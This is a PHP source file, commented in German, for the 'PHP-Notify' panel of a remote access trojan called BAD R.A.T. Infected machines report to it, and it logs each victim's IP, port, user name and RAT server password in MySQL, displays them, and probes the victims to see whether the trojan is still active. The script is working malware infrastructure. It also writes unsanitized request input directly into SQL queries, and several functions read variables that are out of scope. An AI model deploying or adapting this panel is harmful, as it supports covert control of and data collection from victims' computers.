<?php
/*
#####################################################
#    Name   : PHP-Notify (MySQL) for [BAD R.A.T.]   #
#    Version: 0.2 MySQL                             #
#    Copy by: Mr Hawk [BAD R.A.T.]-Company          #
#    Web    : www.bad-rat.de.vu                     #
#####################################################
# THX an  gr00vy (Basis-Script)                     #
#####################################################
# Features:                                         #
# - Aufzeichen der Infos, die vom Server kommen     #
# - Passwortschutz                                  #
# - Beliebige Scriptnamen (passt sich selbst an)    #
# - nur eine Datei                                  #
# - Selbstinstall                                   #
# - Überprüft, ob [BR]-Server online ist            #
#####################################################
# Syntax:                                           #
# URL       : {Scriptname}.php                      #
# Parameter : ?action=login&send=[%IP]|[%PORT]|     #
#             [%VIC]([%USER])|[%TIME]|              #
#             [%DATE]|[%PASS]|[%SRV]                #
#####################################################
# Config:                                           #
# $seper         = Seperator zwischen den Parametern#
# $bgcolor       = Hintergrundfarbe                 #
# $fontcolor     = Schriftfarbe                     #
# $tbbgcolor     = Rahmenfarbe                      #
# $tbfontcolor   = Schriftfarbe in der Tabelle      #
# $tbsize        = Tabellenbreite (in px oder in    #
#                  % z.B.:700px oder 90%)           #
# $db_name       = Regname der Datenbank            #
# $port          = Port der [BR]-Server             #
# $db_server     = Datenbank-Server                 #
# $db_datenbank  = Datenbank                        #
# $db_user       = DB-User                          #
# $db_password   = DB-Password                      #
# $is_password   = Page Passwort nutzen?(1=on;0=off)#
# $password      = Page-Passwort                    #
#                                                   #
# $show_ip       = IP-Adresse    (1=on;0=off)       #
# $show_port     = Port          (1=on;0=off)       #
# $show_vic      = Victim        (1=on;0=off)       #
# $show_user     = Username      (1=on;0=off)       #
# $show_time     = Uhrzeit       (1=on;0=off)       #
# $show_date     = Datum         (1=on;0=off)       #
# $show_pass     = Server-Pass   (1=on;0=off)       #
# $show_srv      = Serverversion (1=on;0=off)       #
#####################################################
*/
//Style & Setting
$seper="|";
$bgcolor="#243C5C";
$fontcolor="#FFFFFF";
$tbbgcolor="#243C5C";
$tbfontcolor="#FFFFFF";
$tbsize="700px";
//MySQL Datenbank
$db_name       = "brip";
$port          = "2323";
$db_server     = "localhost";
$db_datenbank  = "Datenbank";
$db_user       = "User";
$db_password   = "Password";
$is_password   = "0";
$password      = "passwort";
//Eigenschaften
$show_ip       = "1";
$show_port     = "1";
$show_vic      = "1";
$show_user     = "1";
$show_time     = "1";
$show_date     = "1";
$show_pass     = "1";
$show_srv      = "1";

global $action;

echo "<html>\n<head>\n<title>[BAD R.A.T.]-Company PHP(MySQL)-Notify</title>\n<style type=text/css>\n<!--\n";
echo "input \n";
echo "{border-right: ".$fontcolor." 1px solid; border-top: ".$fontcolor." 1px solid;";
echo "border-left: ".$fontcolor." 1px solid; color: ".$fontcolor." ;";
echo "background-color:".$bgcolor."; border-bottom: ".$fontcolor." 1px solid; }";
echo "-->\n</style>\n</head>\n";
echo "<body text=".$fontcolor." bgcolor=".$bgcolor." link=".$fontcolor." alink=".$fontcolor." vlink=".$fontcolor.">\n";
echo "<center><h1>[BAD R.A.T.]-Company<br> PHP(MySQL)-Notify   </h1>\n\n";

if (isset($password) && isset($_GET['action']))
{
    if (isset($_POST['pw'])){ if ($_POST['pw'] != $password)echo "PW falsch!";die();}
     elseif (!isset($_POST['pw'])) die();
   echo "<form action=".basename($PHP_SELF)."?action=".$_GET['action']." method=\"post\">\n";
   echo "Passwort:<br><input name=\"pw\" type=\"password\" ><br><br>\n";
   echo "<input type=\"submit\" value=\" Absenden \"></form>\n";
}

if (isset($_GET['action']))
 {
   if ($_GET['action'] == "show") echo "<form action=".basename($PHP_SELF)."?action=refresh\" method=\"post\">";
    elseif ($_GET['action'] == "refresh") echo "<form action=".basename($PHP_SELF)."?action=show\" method=\"post\">";
   if ($is_password == "1") echo "<input type='hidden' name='pw' value='" . $_POST['pw'] . "'>";
   if ($_GET['action'] == "show")echo "<input type='submit' value=' Aktualisieren '><br><br>";
    elseif ($_GET['action'] == "refresh") echo "<input type='submit' value=' Anzeigen '><br><br>";
}

// Aktualisieren der Server
function refrechme()
{
  $db = @mysql_connect($db_server,$db_user,$db_password) or die ("Keine Verbindung.");
  mysql_select_db($db_datenbank, $db);
  $result = mysql_query("SELECT * FROM ".$db_name);
   while ($ips = mysql_fetch_array($result))
    { $sqlgerecht = "'" . $ips[0] . "'";
      $ping = @fsockopen($ips[0], $port, $errno, $errstr, 1);
      if (!$ping)
      {echo $ips[0] . "<i>... not active</i><br>";
      mysql_query("DELETE FROM ".$db_name." WHERE ip=$sqlgerecht");
      }
      else echo $ips[0] . "<b>... active<b></b><br>";
    }
 }
// Server anzeigen
function showme(){
    $db = @mysql_connect($db_server,$db_user,$db_password) or installme ();
    mysql_select_db($db_datenbank, $db);
    $result = mysql_query("SELECT * FROM ".$db_name);
    while ($ips = mysql_fetch_array($result))
     { echo '<table width='.$tbsize.' bgcolor='.$tbfontcolor.' cellspacing=1 cellpadding=1 border=0>\n ';
      echo '<tr align=center bgcolor='.$tbbgcolor.'><td width=\"30%\">';

      if ($show_ip == "1")   echo "IP:";
      if ($show_port == "1") echo "<br>Port:";
      if ($show_vic == "1")  echo "<br>Vic:";
      if ($show_user == "1") echo "<br>User:";
      if ($show_time == "1") echo "<br>Time:";
      if ($show_date == "1") echo "<br>Date:";
      if ($show_pass == "1") echo "<br>Pass:";
      if ($show_srv == "1")  echo "<br>SrvVer:";
      echo "</td><td bgcolor=".$tbbgcolor.">";
      if ($show_ip == "1")   echo $ips[0] . "<br>";
      if ($show_port == "1") echo $ips[1] . "<br>";
      if ($show_vic == "1")  echo $ips[2] . "<br>";
      if ($show_user == "1") echo $ips[3] . "<br>";
      if ($show_time == "1") echo $ips[4] . "<br>";
      if ($show_date == "1") echo $ips[5] . "<br>";
      if ($show_pass == "1") echo $ips[6] . "<br>";
      if ($show_srv == "1")  echo $ips[7] . "<br>";
      echo "</td></tr></table><br><br>";
     }
}

// Tabelle in Datenbank anlegen
function installme (){
      $db = @mysql_connect($db_server,$db_user,$db_password) or die ("Keine Verbindung.");
      mysql_select_db($db_datenbank, $db);
      mysql_query("CREATE TABLE `".$db_name."` (
      `ip` tinytext NOT NULL,
      `port` tinytext NOT NULL,
      `vic` tinytext NOT NULL,
      `user` tinytext NOT NULL,
      `time` tinytext NOT NULL,
      `date` tinytext NOT NULL,
      `pass` tinytext NOT NULL,
       `srv` tinytext NOT NULL) TYPE=MyISAM;");
       echo "Tabelle wurde erstellt.";
 }

// Server in Datenbank aufnehmen
function logsrv()  {
  $list = array ("\\" => "", "_" => "", "}" => "", "-" => ".", "[" => "", "]" => "", "Yes" => "Ja", "No" => "Nein");
  $body = strtr($_GET['body'],$list);
  $body = explode($seper,$body);
  $body[1] = substr($body[1], 12);
  if (strlen($body[1])>15) $body[1] = $_SERVER['REMOTE_ADDR'];
  $body[2] = substr($body[2], 15);
  $body[3] = substr($body[3], 19);
  $body[4] = substr($body[4], 20);
  $body[5] = substr($body[5], 23);
  $body[6] = substr($body[6], 27);
  $body[7] = substr($body[7], 16);
  $body[8] = substr($body[8], 8);


   $db = @mysql_connect($db_server,$db_user,$db_password) or installme();
   mysql_select_db($db_datenbank, $db);
   mysql_query("INSERT INTO ".$db_name." (ip,port,vic,user,time,date,pass,srv) VALUES ('$body[1]','$body[2]','$body[3]','$body[4]','$body[5]','$body[6]','$body[7]','$body[8]')");
 }


switch($action)
{default: showme();break;

 case 'install' :installme ();break;
 case 'refresh' :refrechme();break;
 case 'show'    :showme();break;
 case 'login'   :logsrv();break;
}
echo "</center>\n</body>\n</html>";?>